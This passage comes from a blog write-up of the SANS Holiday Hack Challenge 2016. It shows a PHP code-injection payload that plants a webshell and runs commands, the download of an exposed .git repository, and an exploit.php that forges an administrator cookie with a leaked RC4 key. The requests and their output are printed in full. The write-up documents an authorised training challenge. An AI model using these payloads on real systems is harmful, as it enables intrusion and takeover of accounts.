    <span class="nv">$outputfilename</span> <span class="o">=</span> <span class="nb">tempnam</span><span class="p">(</span><span class="nv">$basepath</span><span class="p">,</span> <span class="s2">&quot;crashdump-&quot;</span><span class="p">);</span>
    <span class="nb">unlink</span><span class="p">(</span><span class="nv">$outputfilename</span><span class="p">);</span>

    <span class="nv">$outputfilename</span> <span class="o">=</span> <span class="nv">$outputfilename</span> <span class="o">.</span> <span class="s2">&quot;.php&quot;</span><span class="p">;</span>
    <span class="nv">$basename</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$outputfilename</span><span class="p">);</span>

<span class="hll">    <span class="nv">$crashdump_encoded</span> <span class="o">=</span> <span class="s2">&quot;&lt;?php print(&#39;&quot;</span> <span class="o">.</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$crashdump</span><span class="p">,</span> <span class="nx">JSON_PRETTY_PRINT</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&#39;);&quot;</span><span class="p">;</span>
</span>    <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$outputfilename</span><span class="p">,</span> <span class="nv">$crashdump_encoded</span><span class="p">);</span>

    <span class="k">print</span> <span class="s">&lt;&lt;&lt;END</span>
<span class="s">{</span>
<span class="s">    &quot;success&quot; : true,</span>
<span class="s">    &quot;folder&quot; : &quot;docs&quot;,</span>
<span class="s">    &quot;crashdump&quot; : &quot;$basename&quot;</span>
<span class="s">}</span>

<span class="s">END;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">readCrashdump</span><span class="p">(</span><span class="nv">$requestedCrashdump</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$basepath</span> <span class="o">=</span> <span class="s2">&quot;/var/www/html/docs/&quot;</span><span class="p">;</span>
    <span class="nb">chdir</span><span class="p">(</span><span class="nv">$basepath</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$requestedCrashdump</span><span class="p">[</span><span class="s1">&#39;crashdump&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Fatal error! JSON key &#39;crashdump&#39; must be set.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">strrchr</span><span class="p">(</span><span class="nv">$requestedCrashdump</span><span class="p">[</span><span class="s1">&#39;crashdump&#39;</span><span class="p">],</span> <span class="s2">&quot;.&quot;</span><span class="p">),</span> <span class="mi">1</span><span class="p">)</span> <span class="o">===</span> <span class="s2">&quot;php&quot;</span> <span class="p">)</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Fatal error! crashdump value duplicate &#39;.php&#39; extension detected.</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
        <span class="k">require</span><span class="p">(</span><span class="nv">$requestedCrashdump</span><span class="p">[</span><span class="s1">&#39;crashdump&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;.php&#39;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>Now that I'm pasting this source code, I see that the audio file path is given
in the top comment of the file. But I was so eager to find out how
<code>WriteCrashDump</code> and <code>ReadCrashDump</code> work that I didn't see it.
Woopsie for me! Ok, bear with me, and let's suppose that the audio file was not
given in the comment (plus, it's more fun this way, so there!).</p>
<p>When we call <code>WriteCrashDump</code>, we can see that our data are JSON encoded,
surrounded by <code>print('</code> and <code>');</code>, then stored in a PHP file.
Since JSON encoding does not encode single-quote, we can escape from our
<code>print</code> statement:</p>
<div class="highlight"><pre><span class="nf">POST</span> <span class="nn">/exception.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">ex.northpolewonderland.com</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">309</span>

<span class="p">{</span><span class="nt">&quot;operation&quot;</span><span class="p">:</span><span class="s2">&quot;WriteCrashDump&quot;</span><span class="p">,</span><span class="nt">&quot;data&quot;</span><span class="p">:{</span><span class="nt">&quot;message&quot;</span><span class="p">:</span><span class="s2">&quot; &#39;);system($_GET[&#39;c&#39;]);die();print(&#39;&quot;</span><span class="p">,</span><span class="nt">&quot;lmessage&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nt">&quot;strace&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nt">&quot;model&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nt">&quot;sdkint&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nt">&quot;device&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nt">&quot;product&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nt">&quot;lversion&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nt">&quot;vmheapsz&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nt">&quot;vmallocmem&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nt">&quot;vmheapszlimit&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nt">&quot;natallocmem&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nt">&quot;cpuusage&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nt">&quot;totalstor&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nt">&quot;freestor&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nt">&quot;busystor&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nt">&quot;udid&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">}}</span>
</pre></div>
<div class="highlight"><pre><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.10.2</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 29 Dec 2016 16:01:28 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">81</span>

{
    &quot;success&quot; : true,
    &quot;folder&quot; : &quot;docs&quot;,
    &quot;crashdump&quot; : &quot;crashdump-F4Xkdl.php&quot;
}
</pre></div>
<p>We now have a functional webshell, stored in the <code>crashdump-F4Xkdl.php</code>
file. We just have to put our wanted command in the <code>GET</code> parameter
<code>c</code>:</p>
<div class="highlight"><pre><span class="hll"><span class="nf">GET</span> <span class="nn">/docs/crashdump-F4Xkdl.php?c=whoami</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">ex.northpolewonderland.com</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">0</span>
</pre></div>
<div class="highlight"><pre><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.10.2</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 29 Dec 2016 16:03:01 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">28</span>

{
<span class="hll">    &quot;message&quot;: &quot; www-data
</span></pre></div>
<p>Yes, our command was executed properly. We can now list the content of the
webroot:</p>
<div class="highlight"><pre><span class="hll"><span class="nf">GET</span> <span class="nn">/docs/crashdump-F4Xkdl.php?c=ls+-lh+../</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Dalvik/2.1.0 (Linux; U; Android 7.1; Android SDK built for x86 Build/NPF26K)</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">ex.northpolewonderland.com</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">0</span>
</pre></div>
<div class="highlight"><pre><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.10.2</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 29 Dec 2016 16:04:14 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">237</span>

{
    &quot;message&quot;: &quot; total 352K
<span class="hll">-rw-r--r-- 1 jeff     jeff     219K Dec  7 17:08 discombobulated-audio-6-XyzE3N9YqKNH.mp3
</span>drwxr-xr-x 2 www-data www-data 124K Dec 29 16:01 docs
-r--r--r-- 1 www-data www-data 2.4K Dec  7 16:58 exception.php
</pre></div>
<p>We now have the name of the audio file, without having to rely on the comment
in the <code>exception.php</code> file, we're such haXXorz. Anyway, the URL to the
audio file is: <a class="reference external" href="http://ex.northpolewonderland.com/discombobulated-audio-6-XyzE3N9YqKNH.mp3">http://ex.northpolewonderland.com/discombobulated-audio-6-XyzE3N9YqKNH.mp3</a></p>
<img alt="ex_audio_result.png" class="align-center" src="/images/sans-christmas-challenge-2016/ex_audio_result.png" />
</div>
<div class="section" id="the-mobile-analytics-server-post-authentication">
<h3><a class="reference external" href="https://analytics.northpolewonderland.com/">The Mobile Analytics Server (post authentication)</a></h3>
<p>We may have found the first audio file in the analytics server by logging in,
but we haven't taken a look at the functionalities offered by the server.
Basically, we can query some usage information of the Android application,
and save these queries:</p>
<ul class="simple">
<li>First, we performed a query, that we save:</li>
</ul>
<img alt="analytics_guest_query.png" class="align-center" src="/images/sans-christmas-challenge-2016/analytics_guest_query.png" />
<ul class="simple">
<li>Then, we get the result of our query:</li>
</ul>
<img alt="analytics_guest_query_result.png" class="align-center" src="/images/sans-christmas-challenge-2016/analytics_guest_query_result.png" />
<ul class="simple">
<li>We can then consult the result of our saved query:</li>
</ul>
<img alt="analytics_guest_query_saved.png" class="align-center" src="/images/sans-christmas-challenge-2016/analytics_guest_query_saved.png" />
<p>Playing with the different parameters to conduct usual attacks (SQLi, LFI,
etc.) didn't lead to anything. On the suggestion of one of the elves, we can
use <code>nmap -sC</code> to find interesting files hosted by the web server:</p>
<div class="highlight"><pre><span class="nv">$ </span>nmap -sC analytics.northpolewonderland.com
Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2016-12-26 11:52 CET
Nmap scan report <span class="k">for</span> analytics.northpolewonderland.com <span class="o">(</span>104.198.252.157<span class="o">)</span>
Host is up <span class="o">(</span>0.14s latency<span class="o">)</span>.
rDNS record <span class="k">for</span> 104.198.252.157: 157.252.198.104.bc.googleusercontent.com
Not shown: <span class="m">998</span> filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
<span class="p">|</span>_ssh-hostkey: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
443/tcp open  https
<span class="p">|</span> http-git:
<span class="p">|</span>   104.198.252.157:443/.git/
<span class="hll"><span class="p">|</span>     Git repository found!
</span><span class="p">|</span>     Repository description: Unnamed repository<span class="p">;</span> edit this file <span class="s1">&#39;description&#39;</span> to name the...
<span class="p">|</span>_    Last commit message: Finishing touches <span class="o">(</span>style, css, etc<span class="o">)</span>
<span class="p">|</span>_http-methods: No Allow or Public header in OPTIONS response <span class="o">(</span>status code 405<span class="o">)</span>
<span class="p">|</span> http-title: Sprusage Usage Reporter!
<span class="p">|</span>_Requested resource was login.php
<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>analytics.northpolewonderland.com
<span class="p">|</span> Not valid before: 2016-12-07T17:35:00+00:00
<span class="p">|</span>_Not valid after:  2017-03-07T17:35:00+00:00
<span class="p">|</span>_ssl-date: 1970-06-11T20:44:11+00:00<span class="p">;</span> -46y197d14h08m10s from <span class="nb">local </span>time.
<span class="p">|</span> tls-nextprotoneg:
<span class="p">|</span>_  http/1.1
</pre></div>
<p>A Git repository was found. That's very interesting, because it means we can
download the source code of the website to analyze it. It also means that we
have access to the history of every file modifications. Let's download the
source of the web site with <code>wget</code>:</p>
<div class="highlight"><pre><span class="nv">$ </span>wget -r -k -np https://analytics.northpolewonderland.com/.git/
--2016-12-26 11:53:55--  https://analytics.northpolewonderland.com/.git/
Résolution de analytics.northpolewonderland.com <span class="o">(</span>analytics.northpolewonderland.com<span class="o">)</span>… 104.198.252.157
Connexion à analytics.northpolewonderland.com <span class="o">(</span>analytics.northpolewonderland.com<span class="o">)</span><span class="p">|</span>104.198.252.157<span class="p">|</span>:443… connecté.
requête HTTP transmise, en attente de la réponse… <span class="m">200</span> OK
Taille : non indiqué <span class="o">[</span>text/html<span class="o">]</span>
Sauvegarde en : « analytics.northpolewonderland.com/.git/index.html »

analytics.northpolewonderland.com/.git/index.html     <span class="o">[</span> &lt;<span class="o">=</span>&gt;                                                                                                          <span class="o">]</span>   1,36K  --.-KB/s   ds 0s

2016-12-26 11:53:56 <span class="o">(</span>14,2 MB/s<span class="o">)</span> - « analytics.northpolewonderland.com/.git/index.html » sauvegardé <span class="o">[</span>1394<span class="o">]</span>

Chargement de robots.txt <span class="p">;</span> veuillez ignorer les erreurs.
--2016-12-26 11:53:56--  https://analytics.northpolewonderland.com/robots.txt
Réutilisation de la connexion existante à analytics.northpolewonderland.com:443.
requête HTTP transmise, en attente de la réponse… <span class="m">404</span> Not Found
2016-12-26 11:53:56 erreur 404 : Not Found.

--2016-12-26 11:53:56--  https://analytics.northpolewonderland.com/.git/branches/
Réutilisation de la connexion existante à analytics.northpolewonderland.com:443.
requête HTTP transmise, en attente de la réponse… <span class="m">200</span> OK
Taille : non indiqué <span class="o">[</span>text/html<span class="o">]</span>
Sauvegarde en : « analytics.northpolewonderland.com/.git/branches/index.html »

<span class="o">[</span>...<span class="o">]</span>

--2016-12-26 11:54:45--  https://analytics.northpolewonderland.com/.git/logs/refs/heads/master
Réutilisation de la connexion existante à analytics.northpolewonderland.com:443.
requête HTTP transmise, en attente de la réponse… <span class="m">200</span> OK
Taille : <span class="m">4284</span> <span class="o">(</span>4,2K<span class="o">)</span> <span class="o">[</span>application/octet-stream<span class="o">]</span>
Sauvegarde en : « analytics.northpolewonderland.com/.git/logs/refs/heads/master »

analytics.northpolewonderland.com/.git/logs/refs/ 100%<span class="o">[=============================================================================================================</span>&gt;<span class="o">]</span>   4,18K  --.-KB/s   ds 0s

2016-12-26 11:54:45 <span class="o">(</span>45,9 MB/s<span class="o">)</span> — « analytics.northpolewonderland.com/.git/logs/refs/heads/master » sauvegardé <span class="o">[</span>4284/4284<span class="o">]</span>

Terminé — 2016-12-26 11:54:45 —
Temps total effectif : 50s
Téléchargés : 305 fichiers, 614K en 0,9s <span class="o">(</span><span class="m">695</span> KB/s<span class="o">)</span>
<span class="nv">$ </span>ls -la analytics.northpolewonderland.com
total 12
drwxr-xr-x <span class="m">3</span> yme yme <span class="m">4096</span> déc.  <span class="m">26</span> 14:44 .
drwxr-xr-x <span class="m">3</span> yme yme <span class="m">4096</span> déc.  <span class="m">26</span> 14:44 ..
drwxr-xr-x <span class="m">8</span> yme yme <span class="m">4096</span> déc.  <span class="m">26</span> 14:45 .git
</pre></div>
<p>Alright, the Git repository was completely downloaded, but the source files
don't seem to be here. Let's inspect the Git repository:</p>
<div class="highlight"><pre><span class="nv">$ </span><span class="nb">cd </span>analytics.northpolewonderland.com
<span class="nv">$ </span>git status
Sur la branche master
Modifications qui ne seront pas validées :
  <span class="o">(</span>utilisez <span class="s2">&quot;git add/rm &lt;fichier&gt;...&quot;</span> pour mettre à jour ce qui sera validé<span class="o">)</span>
  <span class="o">(</span>utilisez <span class="s2">&quot;git checkout -- &lt;fichier&gt;...&quot;</span> pour annuler les modifications dans la copie de travail<span class="o">)</span>

    supprimé :        README.md
    supprimé :        crypto.php
    supprimé :        css/bootstrap-theme.css
    supprimé :        css/bootstrap-theme.css.map
    supprimé :        css/bootstrap-theme.min.css
    supprimé :        css/bootstrap-theme.min.css.map
    supprimé :        css/bootstrap.css
    supprimé :        css/bootstrap.css.map
    supprimé :        css/bootstrap.min.css
    supprimé :        css/bootstrap.min.css.map
    supprimé :        css/bootstrap.min.css.orig
    supprimé :        db.php
    supprimé :        edit.php
    supprimé :        fonts/glyphicons-halflings-regular.eot
    supprimé :        fonts/glyphicons-halflings-regular.svg
    supprimé :        fonts/glyphicons-halflings-regular.ttf
    supprimé :        fonts/glyphicons-halflings-regular.woff
    supprimé :        fonts/glyphicons-halflings-regular.woff2
    supprimé :        footer.php
    supprimé :        getaudio.php
    supprimé :        header.php
    supprimé :        index.php
    supprimé :        js/bootstrap.js
    supprimé :        js/bootstrap.min.js
    supprimé :        js/npm.js
    supprimé :        login.php
    supprimé :        logout.php
    supprimé :        mp3.php
    supprimé :        query.php
    supprimé :        report.php
    supprimé :        sprusage.sql
    supprimé :        <span class="nb">test</span>/Gemfile
    supprimé :        <span class="nb">test</span>/Gemfile.lock
    supprimé :        <span class="nb">test</span>/test_client.rb
    supprimé :        this_is_html.php
    supprimé :        this_is_json.php
    supprimé :        uuid.php
    supprimé :        view.php
</pre></div>
<p>Sorry about the French Git output, but &quot;supprimé&quot; means &quot;deleted&quot;. So, every
source file was deleted, but the deletion was not commited, which means we can
cancel the deletion:</p>
<div class="highlight"><pre><span class="nv">$ </span>git checkout -- .
<span class="nv">$ </span>ls
crypto.php  db.php    fonts       getaudio.php  index.php  login.php   mp3.php    README.md   sprusage.sql  this_is_html.php  uuid.php
css         edit.php  footer.php  header.php    js         logout.php  query.php  report.php  <span class="nb">test          </span>this_is_json.php  view.php
</pre></div>
<p>You can download the code source archive <a class="reference external" href="/docs/sans-christmas-challenge-2016/analytics.northpolewonderland.com_sources.tar.gz">here</a>
(sha256: <code>13a4f237f817300e1e23a95edaf4ea407a4a346d20c2115ca13eea30b69ee65c</code>).
It contains the Git repository.</p>
<p>Alright, we now have access to the source code of the web application! This
should makes things easier. First of all, we can see that there's a file
<code>edit.php</code>, which is not accessible when we're connected as
<code>guest</code>:</p>
<img alt="analytics_guest_edit_denied.png" class="align-center" src="/images/sans-christmas-challenge-2016/analytics_guest_edit_denied.png" />
<p>Indeed, the <code>edit.php</code> page is only accessible to the
<code>administrator</code> user:</p>
<div class="highlight"><pre><span class="x"># File edit.php</span>
<span class="cp">&lt;?php</span>
  <span class="c1"># This should be the first require</span>
  <span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;this_is_html.php&#39;</span><span class="p">);</span>
  <span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;db.php&#39;</span><span class="p">);</span>

  <span class="c1"># Don&#39;t allow anybody to access this page (yet!)</span>
<span class="hll">  <span class="nx">restrict_page_to_users</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span> <span class="p">[]);</span>
</span></pre></div>
<div class="highlight"><pre><span class="x"># File this_is_html.php</span>
<span class="cp">&lt;?php</span>
<span class="p">[</span><span class="o">...</span><span class="p">]</span>
  <span class="k">function</span> <span class="nf">restrict_page_to_users</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span> <span class="nv">$users</span><span class="p">)</span> <span class="p">{</span>
<span class="hll">    <span class="nv">$username</span> <span class="o">=</span> <span class="nx">get_username</span><span class="p">();</span>
</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$username</span><span class="p">)</span> <span class="p">{</span>
      <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Location: login.php&#39;</span><span class="p">);</span>
      <span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>

<span class="hll">    <span class="nx">check_access</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$users</span><span class="p">);</span>
</span>  <span class="p">}</span>
</pre></div>
<div class="highlight"><pre><span class="x"># File db.php</span>
<span class="cp">&lt;?php</span>
<span class="p">[</span><span class="o">...</span><span class="p">]</span>
  <span class="k">function</span> <span class="nf">get_username</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;AUTH&#39;</span><span class="p">]))</span> <span class="p">{</span>
      <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

<span class="hll">    <span class="nv">$auth</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nx">decrypt</span><span class="p">(</span><span class="nb">pack</span><span class="p">(</span><span class="s2">&quot;H*&quot;</span><span class="p">,</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;AUTH&#39;</span><span class="p">])),</span> <span class="k">true</span><span class="p">);</span>
</span>
    <span class="k">return</span> <span class="nv">$auth</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
  <span class="p">}</span>
<span class="p">[</span><span class="o">...</span><span class="p">]</span>
 <span class="k">function</span> <span class="nf">check_access</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$users</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1"># Allow administrator to access any page</span>
<span class="hll">    <span class="k">if</span><span class="p">(</span><span class="nv">$username</span> <span class="o">==</span> <span class="s1">&#39;administrator&#39;</span><span class="p">)</span> <span class="p">{</span>
</span>      <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$users</span><span class="p">))</span> <span class="p">{</span>
      <span class="nx">reply</span><span class="p">(</span><span class="mi">403</span><span class="p">,</span> <span class="s1">&#39;Access denied!&#39;</span><span class="p">);</span>
      <span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
</pre></div>
<p>From this source file, we can determine that <code>administrator</code> has access
to every page, and that the application uses the cookie <code>AUTH</code> to
determine the current logged in username. Let's see how this cookie is
generated:</p>
<div class="highlight"><pre><span class="x"># File login.php</span>
<span class="cp">&lt;?php</span>
<span class="p">[</span><span class="o">...</span><span class="p">]</span>
    <span class="k">print</span> <span class="s2">&quot;Successfully logged in!&quot;</span><span class="p">;</span>

<span class="hll">    <span class="nv">$auth</span> <span class="o">=</span> <span class="nx">encrypt</span><span class="p">(</span><span class="nb">json_encode</span><span class="p">([</span>
</span>      <span class="s1">&#39;username&#39;</span> <span class="o">=&gt;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">],</span>
      <span class="s1">&#39;date&#39;</span> <span class="o">=&gt;</span> <span class="nb">date</span><span class="p">(</span><span class="nx">DateTime</span><span class="o">::</span><span class="na">ISO8601</span><span class="p">),</span>
    <span class="p">]));</span>

    <span class="nb">setcookie</span><span class="p">(</span><span class="s1">&#39;AUTH&#39;</span><span class="p">,</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nv">$auth</span><span class="p">));</span>

    <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Location: index.php?msg=Successfully%20logged%20in!&#39;</span><span class="p">);</span>
  <span class="p">}</span>
</pre></div>
<div class="highlight"><pre><span class="x"># File crypto.php</span>
<span class="cp">&lt;?php</span>
  <span class="nb">define</span><span class="p">(</span><span class="s1">&#39;KEY&#39;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x61\x17\xa4\x95\xbf\x3d\xd7\xcd\x2e\x0d\x8b\xcb\x9f\x79\xe1\xdc</span><span class="s2">&quot;</span><span class="p">);</span>

  <span class="k">function</span> <span class="nf">encrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nb">mcrypt_encrypt</span><span class="p">(</span><span class="nx">MCRYPT_ARCFOUR</span><span class="p">,</span> <span class="nx">KEY</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="s1">&#39;stream&#39;</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="k">function</span> <span class="nf">decrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nb">mcrypt_decrypt</span><span class="p">(</span><span class="nx">MCRYPT_ARCFOUR</span><span class="p">,</span> <span class="nx">KEY</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="s1">&#39;stream&#39;</span><span class="p">);</span>
  <span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>So, we can see that the username is stored in a JSON object, stored encrypted
in the cookie <code>AUTH</code>. Since we have the encryption key in
<code>crypto.php</code>, we can generate our own cookie:</p>
<div class="highlight"><pre><span class="cp">&lt;?php</span>
    <span class="k">include</span><span class="p">(</span><span class="s1">&#39;crypto.php&#39;</span><span class="p">);</span>

    <span class="nv">$auth</span> <span class="o">=</span> <span class="nx">encrypt</span><span class="p">(</span><span class="nb">json_encode</span><span class="p">([</span>
      <span class="s1">&#39;username&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;administrator&#39;</span><span class="p">,</span>
      <span class="s1">&#39;date&#39;</span> <span class="o">=&gt;</span> <span class="nb">date</span><span class="p">(</span><span class="nx">DateTime</span><span class="o">::</span><span class="na">ISO8601</span><span class="p">),</span>
    <span class="p">]));</span>

    <span class="k">echo</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nv">$auth</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<div class="highlight"><pre><span class="nv">$ </span>php exploit.php
82532b2136348aaa1fa7dd2243dc0dc1e10948231f339e5edd5770daf9eef18a4384f6e7bca04d86e573b965cc9c6549b449486763a20363b71876884152
</pre></div>
<p>We can now log into the application as administrator:</p>
<img alt="analytics_administrator_login.png" class="align-center" src="/images/sans-christmas-challenge-2016/analytics_administrator_login.png" />
<p>There was another, more elegant method, to recover <code>administrator</code>'s
password. Since we have the Git repository of the web application, we have
access to every file's history. We can see that in the source of the website,
there is an SQL schema file, <code>sprusage.sql</code>. This file is used to create
a database with the right schema. It's often created with a dump of the
currently deployed database. However, if we take a look at it, we won't see
any data in it, apart from the tables creation instructions:</p>
<div class="highlight"><pre><span class="k">DROP</span> <span class="k">TABLE</span> <span class="n">IF</span> <span class="k">EXISTS</span> <span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="p">;</span>
<span class="cm">/*!40101 SET @saved_cs_client     = @@character_set_client */</span><span class="p">;</span>
<span class="cm">/*!40101 SET character_set_client = utf8 */</span><span class="p">;</span>
<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="o">`</span><span class="n">users</span><span class="o">`</span> <span class="p">(</span>
  <span class="o">`</span><span class="n">uid</span><span class="o">`</span> <span class="nb">int</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
  <span class="o">`</span><span class="n">username</span><span class="o">`</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
  <span class="o">`</span><span class="n">password</span><span class="o">`</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
  <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="p">(</span><span class="o">`</span><span class="n">uid</span><span class="o">`</span><span class="p">)</span>
<span class="p">)</span> <span class="n">ENGINE</span><span class="o">=</span><span class="n">InnoDB</span> <span class="k">DEFAULT</span> <span class="n">CHARSET</span><span class="o">=</span><span class="n">latin1</span><span class="p">;</span>
<span class="cm">/*!40101 SET character_set_client = @saved_cs_client */</span><span class="p">;</span>
</pre></div>
<p>But, if we take a look at the Git log, we can see that the file was &quot;fixed&quot;:</p>
<pre class="literal-block">
